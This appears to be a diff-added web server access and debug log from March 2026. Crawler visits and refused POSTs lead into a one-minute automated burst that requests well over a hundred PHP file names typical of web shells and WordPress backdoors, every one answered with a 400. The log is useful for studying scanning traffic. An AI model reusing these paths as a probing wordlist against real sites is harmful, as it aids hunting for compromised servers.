+ - - [04/Mar/2026:06:52:36 -0300] "GET / HTTP/1.1" 200 1020 "-" "Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)"
+[2026-03-04 06:52:36 -0300] [47512] [DEBUG] GET /manage/account/login
+ - - [04/Mar/2026:06:52:36 -0300] "GET /manage/account/login HTTP/1.1" 404 179 "-" "Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)"
+[2026-03-04 06:52:37 -0300] [47512] [DEBUG] GET /admin/index.html
+ - - [04/Mar/2026:06:52:37 -0300] "GET /admin/index.html HTTP/1.1" 302 0 "-" "Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)"
+[2026-03-04 06:52:38 -0300] [47513] [DEBUG] GET /admin/login/
+ - - [04/Mar/2026:06:52:38 -0300] "GET /admin/login/?next=/admin/index.html HTTP/1.1" 200 4136 "http://136.116.33.237/admin/index.html" "Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)"
+[2026-03-04 07:22:53 -0300] [47513] [DEBUG] GET /
+ - - [04/Mar/2026:07:22:53 -0300] "GET / HTTP/1.1" 200 1020 "-" "Mozilla/5.0 zgrab/0.x"
+[2026-03-04 07:41:39 -0300] [47513] [DEBUG] GET /
+ - - [04/Mar/2026:07:41:39 -0300] "GET / HTTP/1.1" 200 1020 "-" "Mozilla/5.0 zgrab/0.x"
+[2026-03-04 07:52:23 -0300] [47514] [DEBUG] GET /SDK/webLanguage
+ - - [04/Mar/2026:07:52:23 -0300] "GET /SDK/webLanguage HTTP/1.1" 404 179 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
+[2026-03-04 07:55:03 -0300] [47509] [DEBUG] POST /
+ - - [04/Mar/2026:07:55:03 -0300] "POST / HTTP/1.1" 403 1421 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
+[2026-03-04 08:33:01 -0300] [47513] [DEBUG] GET /
+ - - [04/Mar/2026:08:33:01 -0300] "GET / HTTP/1.1" 200 1020 "-" "Mozilla/5.0"
+[2026-03-04 08:55:05 -0300] [47513] [DEBUG] GET /
+ - - [04/Mar/2026:08:55:05 -0300] "GET / HTTP/1.1" 200 1020 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0"
+[2026-03-04 09:05:04 -0300] [47514] [DEBUG] GET /
+ - - [04/Mar/2026:09:05:04 -0300] "GET / HTTP/1.1" 200 1020 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.86 Safari/537.36 BitSightBot/1.0"
+[2026-03-04 09:10:21 -0300] [47512] [DEBUG] POST /
+ - - [04/Mar/2026:09:10:21 -0300] "POST / HTTP/1.1" 403 1421 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
+[2026-03-04 09:18:25 -0300] [47509] [DEBUG] GET /
+ - - [04/Mar/2026:09:18:25 -0300] "GET / HTTP/1.1" 200 1020 "-" "Go-http-client/1.1"
+[2026-03-04 09:28:38 -0300] [47513] [DEBUG] GET /
+ - - [04/Mar/2026:09:28:38 -0300] "GET / HTTP/1.1" 200 1020 "-" "-"
+[2026-03-04 10:27:57 -0300] [47513] [DEBUG] GET /wp-content/plugins/hellopress/wp_filemanager.php
+ - - [04/Mar/2026:10:27:57 -0300] "GET /wp-content/plugins/hellopress/wp_filemanager.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:27:57 -0300] [47513] [DEBUG] GET /class-t.api.php
+ - - [04/Mar/2026:10:27:57 -0300] "GET /class-t.api.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:27:57 -0300] [47512] [DEBUG] GET /zwso.php
+ - - [04/Mar/2026:10:27:57 -0300] "GET /zwso.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:27:58 -0300] [47510] [DEBUG] GET /wp-admin/css/colors/blue/index.php
+ - - [04/Mar/2026:10:27:58 -0300] "GET /wp-admin/css/colors/blue/index.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:27:58 -0300] [47510] [DEBUG] GET /class19.php
+ - - [04/Mar/2026:10:27:58 -0300] "GET /class19.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:27:58 -0300] [47514] [DEBUG] GET /class20.php
+ - - [04/Mar/2026:10:27:58 -0300] "GET /class20.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:27:58 -0300] [47513] [DEBUG] GET /admin.php
+ - - [04/Mar/2026:10:27:58 -0300] "GET /admin.php?p= HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:27:58 -0300] [47514] [DEBUG] GET /randkeyword.php
+ - - [04/Mar/2026:10:27:58 -0300] "GET /randkeyword.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:27:58 -0300] [47509] [DEBUG] GET /fwe.php
+ - - [04/Mar/2026:10:27:58 -0300] "GET /fwe.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:27:58 -0300] [47509] [DEBUG] GET /images/m.php
+ - - [04/Mar/2026:10:27:58 -0300] "GET /images/m.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:27:58 -0300] [47509] [DEBUG] GET /g.php
+ - - [04/Mar/2026:10:27:58 -0300] "GET /g.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:27:58 -0300] [47510] [DEBUG] GET /tx1.php
+ - - [04/Mar/2026:10:27:58 -0300] "GET /tx1.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:27:58 -0300] [47513] [DEBUG] GET /xv.php
+ - - [04/Mar/2026:10:27:58 -0300] "GET /xv.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:27:58 -0300] [47512] [DEBUG] GET /x56.php
+ - - [04/Mar/2026:10:27:58 -0300] "GET /x56.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:27:58 -0300] [47511] [DEBUG] GET /htaccess.php
+ - - [04/Mar/2026:10:27:58 -0300] "GET /htaccess.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:27:58 -0300] [47510] [DEBUG] GET /readme.php
+ - - [04/Mar/2026:10:27:58 -0300] "GET /readme.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:27:58 -0300] [47510] [DEBUG] GET /x50.php
+ - - [04/Mar/2026:10:27:58 -0300] "GET /x50.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:27:58 -0300] [47510] [DEBUG] GET /fv.php
+ - - [04/Mar/2026:10:27:58 -0300] "GET /fv.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:27:58 -0300] [47509] [DEBUG] GET /file.php
+ - - [04/Mar/2026:10:27:58 -0300] "GET /file.php? HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:27:58 -0300] [47511] [DEBUG] GET /lsd.php
+ - - [04/Mar/2026:10:27:58 -0300] "GET /lsd.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:27:58 -0300] [47509] [DEBUG] GET /as.php
+ - - [04/Mar/2026:10:27:58 -0300] "GET /as.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:27:58 -0300] [47514] [DEBUG] GET /wsd.php
+ - - [04/Mar/2026:10:27:58 -0300] "GET /wsd.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:27:59 -0300] [47511] [DEBUG] GET /gtc.php
+ - - [04/Mar/2026:10:27:59 -0300] "GET /gtc.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:27:59 -0300] [47511] [DEBUG] GET /atx.php
+ - - [04/Mar/2026:10:27:59 -0300] "GET /atx.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:27:59 -0300] [47511] [DEBUG] GET /z60.php
+ - - [04/Mar/2026:10:27:59 -0300] "GET /z60.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:27:59 -0300] [47513] [DEBUG] GET /403.php
+ - - [04/Mar/2026:10:27:59 -0300] "GET /403.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:27:59 -0300] [47510] [DEBUG] GET /m.php
+ - - [04/Mar/2026:10:27:59 -0300] "GET /m.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:27:59 -0300] [47514] [DEBUG] GET /themes.php
+ - - [04/Mar/2026:10:27:59 -0300] "GET /themes.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:27:59 -0300] [47512] [DEBUG] GET /wp-admin/maint/about.php
+ - - [04/Mar/2026:10:27:59 -0300] "GET /wp-admin/maint/about.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:27:59 -0300] [47513] [DEBUG] GET /wp-admin/network/wp-conflg.php
+ - - [04/Mar/2026:10:27:59 -0300] "GET /wp-admin/network/wp-conflg.php?p= HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:27:59 -0300] [47513] [DEBUG] GET /click.php
+ - - [04/Mar/2026:10:27:59 -0300] "GET /click.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:27:59 -0300] [47513] [DEBUG] GET /install.php
+ - - [04/Mar/2026:10:27:59 -0300] "GET /install.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:27:59 -0300] [47509] [DEBUG] GET /lv.php
+ - - [04/Mar/2026:10:27:59 -0300] "GET /lv.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:27:59 -0300] [47512] [DEBUG] GET /simple.php
+ - - [04/Mar/2026:10:27:59 -0300] "GET /simple.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:27:59 -0300] [47510] [DEBUG] GET /css.php
+ - - [04/Mar/2026:10:27:59 -0300] "GET /css.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:27:59 -0300] [47512] [DEBUG] GET /cong.php
+ - - [04/Mar/2026:10:27:59 -0300] "GET /cong.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:27:59 -0300] [47510] [DEBUG] GET /wp-includes/images/wp-login.php
+ - - [04/Mar/2026:10:27:59 -0300] "GET /wp-includes/images/wp-login.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:27:59 -0300] [47511] [DEBUG] GET /cong.php
+ - - [04/Mar/2026:10:27:59 -0300] "GET /cong.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:27:59 -0300] [47511] [DEBUG] GET /w.php
+ - - [04/Mar/2026:10:27:59 -0300] "GET /w.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:27:59 -0300] [47514] [DEBUG] GET /404.php
+ - - [04/Mar/2026:10:27:59 -0300] "GET /404.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:27:59 -0300] [47510] [DEBUG] GET /ioxi-o.php
+ - - [04/Mar/2026:10:27:59 -0300] "GET /ioxi-o.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:27:59 -0300] [47513] [DEBUG] GET /0x.php
+ - - [04/Mar/2026:10:27:59 -0300] "GET /0x.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:00 -0300] [47514] [DEBUG] GET /css.php
+ - - [04/Mar/2026:10:28:00 -0300] "GET /css.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:00 -0300] [47511] [DEBUG] GET /222.php
+ - - [04/Mar/2026:10:28:00 -0300] "GET /222.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:00 -0300] [47514] [DEBUG] GET /wp-content/index.php
+ - - [04/Mar/2026:10:28:00 -0300] "GET /wp-content/index.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:00 -0300] [47513] [DEBUG] GET /admin.php
+ - - [04/Mar/2026:10:28:00 -0300] "GET /admin.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:00 -0300] [47510] [DEBUG] GET /wp-admin/maint/maint.php
+ - - [04/Mar/2026:10:28:00 -0300] "GET /wp-admin/maint/maint.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:00 -0300] [47512] [DEBUG] GET /classwithtostring.php
+ - - [04/Mar/2026:10:28:00 -0300] "GET /classwithtostring.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:00 -0300] [47514] [DEBUG] GET /abcd.php
+ - - [04/Mar/2026:10:28:00 -0300] "GET /abcd.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:00 -0300] [47509] [DEBUG] GET /autoload_classmap.php
+ - - [04/Mar/2026:10:28:00 -0300] "GET /autoload_classmap.php?p= HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:00 -0300] [47509] [DEBUG] GET /inputs.php
+ - - [04/Mar/2026:10:28:00 -0300] "GET /inputs.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:00 -0300] [47513] [DEBUG] GET /about.php
+ - - [04/Mar/2026:10:28:00 -0300] "GET /about.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:00 -0300] [47512] [DEBUG] GET /alfa.php
+ - - [04/Mar/2026:10:28:00 -0300] "GET /alfa.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:00 -0300] [47514] [DEBUG] GET /themes/twentytwentytwo/index.php
+ - - [04/Mar/2026:10:28:00 -0300] "GET /themes/twentytwentytwo/index.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:00 -0300] [47510] [DEBUG] GET /wp-admin/js/wp-conflg.php
+ - - [04/Mar/2026:10:28:00 -0300] "GET /wp-admin/js/wp-conflg.php?p= HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:00 -0300] [47513] [DEBUG] GET /wp-admin/wp-conflg.php
+ - - [04/Mar/2026:10:28:00 -0300] "GET /wp-admin/wp-conflg.php?p= HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:00 -0300] [47512] [DEBUG] GET /wp-admin/css/wp-conflg.php
+ - - [04/Mar/2026:10:28:00 -0300] "GET /wp-admin/css/wp-conflg.php?p= HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:00 -0300] [47511] [DEBUG] GET /manager.php
+ - - [04/Mar/2026:10:28:00 -0300] "GET /manager.php?p= HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:00 -0300] [47510] [DEBUG] GET /item.php
+ - - [04/Mar/2026:10:28:00 -0300] "GET /item.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:00 -0300] [47512] [DEBUG] GET /plugins/Cache/footer.php
+ - - [04/Mar/2026:10:28:00 -0300] "GET /plugins/Cache/footer.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:00 -0300] [47513] [DEBUG] GET /404.php
+ - - [04/Mar/2026:10:28:00 -0300] "GET /404.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:00 -0300] [47510] [DEBUG] GET /mail.php
+ - - [04/Mar/2026:10:28:00 -0300] "GET /mail.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:00 -0300] [47514] [DEBUG] GET /wp-content/plugins/index.php
+ - - [04/Mar/2026:10:28:00 -0300] "GET /wp-content/plugins/index.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:00 -0300] [47509] [DEBUG] GET /sx.php
+ - - [04/Mar/2026:10:28:00 -0300] "GET /sx.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:00 -0300] [47514] [DEBUG] GET /wp-admin/maint/admin.php
+ - - [04/Mar/2026:10:28:00 -0300] "GET /wp-admin/maint/admin.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:00 -0300] [47511] [DEBUG] GET /alfa.php
+ - - [04/Mar/2026:10:28:00 -0300] "GET /alfa.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:00 -0300] [47510] [DEBUG] GET /1.php
+ - - [04/Mar/2026:10:28:00 -0300] "GET /1.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:00 -0300] [47510] [DEBUG] GET /byp.php
+ - - [04/Mar/2026:10:28:00 -0300] "GET /byp.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:00 -0300] [47513] [DEBUG] GET /wp-trackback.php
+ - - [04/Mar/2026:10:28:00 -0300] "GET /wp-trackback.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:01 -0300] [47513] [DEBUG] GET /wp-admin/network/plugins.php
+ - - [04/Mar/2026:10:28:01 -0300] "GET /wp-admin/network/plugins.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:01 -0300] [47514] [DEBUG] GET /wp-admin/about.php
+ - - [04/Mar/2026:10:28:01 -0300] "GET /wp-admin/about.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:01 -0300] [47512] [DEBUG] GET /gmo.php
+ - - [04/Mar/2026:10:28:01 -0300] "GET /gmo.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:01 -0300] [47510] [DEBUG] GET /wp-includes/ID3/about.php
+ - - [04/Mar/2026:10:28:01 -0300] "GET /wp-includes/ID3/about.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:01 -0300] [47509] [DEBUG] GET /css/index.php
+ - - [04/Mar/2026:10:28:01 -0300] "GET /css/index.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:01 -0300] [47512] [DEBUG] GET /wp-includes/SimplePie/wp-login.php
+ - - [04/Mar/2026:10:28:01 -0300] "GET /wp-includes/SimplePie/wp-login.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:01 -0300] [47509] [DEBUG] GET /wp-content/themes/about.php
+ - - [04/Mar/2026:10:28:01 -0300] "GET /wp-content/themes/about.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:01 -0300] [47514] [DEBUG] GET /filemanager/dialog.php
+ - - [04/Mar/2026:10:28:01 -0300] "GET /filemanager/dialog.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:01 -0300] [47513] [DEBUG] GET /wp-admin/maint/index.php
+ - - [04/Mar/2026:10:28:01 -0300] "GET /wp-admin/maint/index.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:01 -0300] [47514] [DEBUG] GET /wp-includes/customize/about.php
+ - - [04/Mar/2026:10:28:01 -0300] "GET /wp-includes/customize/about.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:01 -0300] [47511] [DEBUG] GET /index/function.php
+ - - [04/Mar/2026:10:28:01 -0300] "GET /index/function.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:01 -0300] [47514] [DEBUG] GET /uploads/autoload_classmap.php
+ - - [04/Mar/2026:10:28:01 -0300] "GET /uploads/autoload_classmap.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:01 -0300] [47512] [DEBUG] GET /wp-includes/style-engine/about.php
+ - - [04/Mar/2026:10:28:01 -0300] "GET /wp-includes/style-engine/about.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:01 -0300] [47510] [DEBUG] GET /ww1.php
+ - - [04/Mar/2026:10:28:01 -0300] "GET /ww1.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:01 -0300] [47513] [DEBUG] GET /about/function.php
+ - - [04/Mar/2026:10:28:01 -0300] "GET /about/function.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:01 -0300] [47511] [DEBUG] GET /admin/function.php
+ - - [04/Mar/2026:10:28:01 -0300] "GET /admin/function.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:01 -0300] [47513] [DEBUG] GET /css/colors/blue/index.php
+ - - [04/Mar/2026:10:28:01 -0300] "GET /css/colors/blue/index.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:01 -0300] [47513] [DEBUG] GET /security.php
+ - - [04/Mar/2026:10:28:01 -0300] "GET /security.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:01 -0300] [47509] [DEBUG] GET /wp-admin/user/about.php
+ - - [04/Mar/2026:10:28:01 -0300] "GET /wp-admin/user/about.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:01 -0300] [47511] [DEBUG] GET /wp-admin/js/index.php
+ - - [04/Mar/2026:10:28:01 -0300] "GET /wp-admin/js/index.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:01 -0300] [47509] [DEBUG] GET /wp-content/upgrade/about.php
+ - - [04/Mar/2026:10:28:01 -0300] "GET /wp-content/upgrade/about.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:01 -0300] [47513] [DEBUG] GET /wp-includes/assets/index.php
+ - - [04/Mar/2026:10:28:01 -0300] "GET /wp-includes/assets/index.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:01 -0300] [47510] [DEBUG] GET /wp-content/radio.php
+ - - [04/Mar/2026:10:28:01 -0300] "GET /wp-content/radio.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:01 -0300] [47514] [DEBUG] GET /wp-includes/fonts/index.php
+ - - [04/Mar/2026:10:28:01 -0300] "GET /wp-includes/fonts/index.php?p= HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:01 -0300] [47511] [DEBUG] GET /wp-content/admin.php
+ - - [04/Mar/2026:10:28:01 -0300] "GET /wp-content/admin.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:01 -0300] [47514] [DEBUG] GET /wp-content/plugins/admin.php
+ - - [04/Mar/2026:10:28:01 -0300] "GET /wp-content/plugins/admin.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:02 -0300] [47511] [DEBUG] GET /wp-content/themes/twentytwentytwo/index.php
+ - - [04/Mar/2026:10:28:02 -0300] "GET /wp-content/themes/twentytwentytwo/index.php?p= HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:02 -0300] [47514] [DEBUG] GET /class.php
+ - - [04/Mar/2026:10:28:02 -0300] "GET /class.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:02 -0300] [47509] [DEBUG] GET /bless5.php
+ - - [04/Mar/2026:10:28:02 -0300] "GET /bless5.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:02 -0300] [47509] [DEBUG] GET /wp-includes/js/codemirror/index.php
+ - - [04/Mar/2026:10:28:02 -0300] "GET /wp-includes/js/codemirror/index.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:02 -0300] [47513] [DEBUG] GET /wp-includes/block-patterns/index.php
+ - - [04/Mar/2026:10:28:02 -0300] "GET /wp-includes/block-patterns/index.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:02 -0300] [47512] [DEBUG] GET /lock360.php
+ - - [04/Mar/2026:10:28:02 -0300] "GET /lock360.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:02 -0300] [47514] [DEBUG] GET /f35.php
+ - - [04/Mar/2026:10:28:02 -0300] "GET /f35.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:02 -0300] [47514] [DEBUG] GET /ioxi-o1.php
+ - - [04/Mar/2026:10:28:02 -0300] "GET /ioxi-o1.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:02 -0300] [47511] [DEBUG] GET /juuuu.php
+ - - [04/Mar/2026:10:28:02 -0300] "GET /juuuu.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:02 -0300] [47513] [DEBUG] GET /ha.php
+ - - [04/Mar/2026:10:28:02 -0300] "GET /ha.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:02 -0300] [47510] [DEBUG] GET /gg.php
+ - - [04/Mar/2026:10:28:02 -0300] "GET /gg.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:02 -0300] [47510] [DEBUG] GET /we2.php
+ - - [04/Mar/2026:10:28:02 -0300] "GET /we2.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:02 -0300] [47509] [DEBUG] GET /04.php
+ - - [04/Mar/2026:10:28:02 -0300] "GET /04.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:02 -0300] [47511] [DEBUG] GET /333.php
+ - - [04/Mar/2026:10:28:02 -0300] "GET /333.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:02 -0300] [47512] [DEBUG] GET /520.php
+ - - [04/Mar/2026:10:28:02 -0300] "GET /520.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:02 -0300] [47510] [DEBUG] GET /ar.php
+ - - [04/Mar/2026:10:28:02 -0300] "GET /ar.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:02 -0300] [47512] [DEBUG] GET /x.php
+ - - [04/Mar/2026:10:28:02 -0300] "GET /x.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:02 -0300] [47511] [DEBUG] GET /xx.php
+ - - [04/Mar/2026:10:28:02 -0300] "GET /xx.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:02 -0300] [47511] [DEBUG] GET /gifclass4.php
+ - - [04/Mar/2026:10:28:02 -0300] "GET /gifclass4.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:02 -0300] [47511] [DEBUG] GET /2clas.php
+ - - [04/Mar/2026:10:28:02 -0300] "GET /2clas.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:02 -0300] [47510] [DEBUG] GET /ave.php
+ - - [04/Mar/2026:10:28:02 -0300] "GET /ave.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:02 -0300] [47509] [DEBUG] GET /wrt.php
+ - - [04/Mar/2026:10:28:02 -0300] "GET /wrt.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:02 -0300] [47511] [DEBUG] GET /bibil.php
+ - - [04/Mar/2026:10:28:02 -0300] "GET /bibil.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:02 -0300] [47511] [DEBUG] GET /radio.php
+ - - [04/Mar/2026:10:28:02 -0300] "GET /radio.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:02 -0300] [47512] [DEBUG] GET /files.php
+ - - [04/Mar/2026:10:28:02 -0300] "GET /files.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:02 -0300] [47513] [DEBUG] GET /file7.php
+ - - [04/Mar/2026:10:28:02 -0300] "GET /file7.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:02 -0300] [47511] [DEBUG] GET /gifclass.php
+ - - [04/Mar/2026:10:28:02 -0300] "GET /gifclass.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:03 -0300] [47513] [DEBUG] GET /wp-admin/css/colors/midnight/about.php
+ - - [04/Mar/2026:10:28:03 -0300] "GET /wp-admin/css/colors/midnight/about.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:03 -0300] [47510] [DEBUG] GET /nox.php
+ - - [04/Mar/2026:10:28:03 -0300] "GET /nox.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:03 -0300] [47512] [DEBUG] GET /file48.php
+ - - [04/Mar/2026:10:28:03 -0300] "GET /file48.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:03 -0300] [47514] [DEBUG] GET /info.php
+ - - [04/Mar/2026:10:28:03 -0300] "GET /info.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:03 -0300] [47514] [DEBUG] GET /class9.php
+ - - [04/Mar/2026:10:28:03 -0300] "GET /class9.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:03 -0300] [47513] [DEBUG] GET /la.php
+ - - [04/Mar/2026:10:28:03 -0300] "GET /la.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:03 -0300] [47514] [DEBUG] GET /bless11.php
+ - - [04/Mar/2026:10:28:03 -0300] "GET /bless11.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:03 -0300] [47511] [DEBUG] GET /ccou.php
+ - - [04/Mar/2026:10:28:03 -0300] "GET /ccou.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:03 -0300] [47510] [DEBUG] GET /ton.php
+ - - [04/Mar/2026:10:28:03 -0300] "GET /ton.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:03 -0300] [47513] [DEBUG] GET /403.php
+ - - [04/Mar/2026:10:28:03 -0300] "GET /403.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:03 -0300] [47514] [DEBUG] GET /file9.php
+ - - [04/Mar/2026:10:28:03 -0300] "GET /file9.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:03 -0300] [47509] [DEBUG] GET /ac.php
+ - - [04/Mar/2026:10:28:03 -0300] "GET /ac.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:03 -0300] [47513] [DEBUG] GET /new4.php
+ - - [04/Mar/2026:10:28:03 -0300] "GET /new4.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:03 -0300] [47511] [DEBUG] GET /pop.php
+ - - [04/Mar/2026:10:28:03 -0300] "GET /pop.php HTTP/1.1" 400 143 "-" "-"
